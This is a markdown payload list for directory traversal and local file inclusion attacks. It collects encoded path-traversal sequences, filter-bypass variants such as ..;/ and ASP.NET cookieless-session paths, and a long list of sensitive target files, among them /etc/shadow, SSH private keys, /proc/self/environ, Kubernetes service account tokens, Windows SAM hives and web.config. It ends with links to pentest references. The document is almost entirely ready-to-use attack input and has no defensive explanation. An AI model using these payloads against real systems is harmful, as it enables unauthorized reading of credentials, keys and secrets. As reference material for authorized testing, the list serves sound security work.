# Payloads
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
. = %u002e
/ = %u2215
\ = %u2216
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
..././
...\.\
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
. = %252e
/ = %252f
\ = %255c
\\localhost\c$\windows\win.ini
/(S(X))/
/(Y(Z))/
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/
/(S(X))/admin/(S(X))/main.aspx
/(S(x))/b/(S(x))in/Navigator.dll
/MyApp/(S(X))/
/admin/(S(X))/main.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx
url:file:///etc/passwd
url:http://127.0.0.1:8080
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
root directory: "/"
directory separator: "/"
root directory: "<drive letter>:\"
directory separator: "\" or "/"
root directory: "<drive letter>:"
c:/documents and settings/administrator/ntuser.ini
c:/documents and settings/administrator/desktop/desktop.ini
c:/users/administrator/desktop/desktop.ini
c:/users/administrator/ntuser.ini
c:/system volume information/wpsettings.dat
C:/Windows/CSC/v2.0.6/pq
C:/Windows/CSC/v2.0.6/sm
C:/$Recycle.Bin/S-1-5-18/desktop.ini
```
# Resources
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://www.thehacker.recipes/web/inputs/directory-traversal
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md


















  
